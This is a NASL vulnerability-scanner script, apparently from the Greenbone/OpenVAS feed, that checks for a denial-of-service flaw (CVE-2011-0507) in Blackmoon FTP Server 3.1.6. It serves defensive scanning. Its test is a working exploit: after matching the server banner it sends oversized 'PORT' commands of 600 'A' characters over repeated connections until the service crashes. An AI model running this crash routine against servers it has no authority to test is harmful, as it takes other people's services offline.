if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800194" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-01-21 14:38:54 +0100 (Fri, 21 Jan 2011)" );
	script_cve_id( "CVE-2011-0507" );
	script_bugtraq_id( 45814 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:N/A:P" );
	script_name( "Blackmoon FTP PORT Command Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/blackmoon/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42933/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15986/" );
	script_tag( name: "impact", value: "Successful exploitation will allow the remote attackers to cause a denial of
  service." );
	script_tag( name: "affected", value: "Blackmoon FTP 3.1.6 - Build 1735." );
	script_tag( name: "insight", value: "The flaw is due to an error while parsing PORT command, which can be
  exploited to crash the FTP service by sending multiple PORT commands with
  'big' parameter." );
	script_tag( name: "solution", value: "Upgrade to Blackmoon FTP Version 3.1.7 Build 17356 or higher." );
	script_tag( name: "summary", value: "The host is running Blackmoon FTP Server and is prone to denial of service
  vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "BlackMoon FTP Server" )){
	exit( 0 );
}
crafted_port_cmd = NASLString( "PORT ", crap( length: 600, data: "A" ) );
for(i = 0;i < 100;i++){
	soc = open_sock_tcp( ftpPort );
	if(!soc){
		security_message( ftpPort );
		exit( 0 );
	}
	res1 = ftp_recv_line( socket: soc );
	res2 = ftp_send_cmd( socket: soc, cmd: crafted_port_cmd );
	if(ContainsString( res2, "553 Requested action not taken (line too long)" )){
		exit( 0 );
	}
	ftp_close( socket: soc );
}

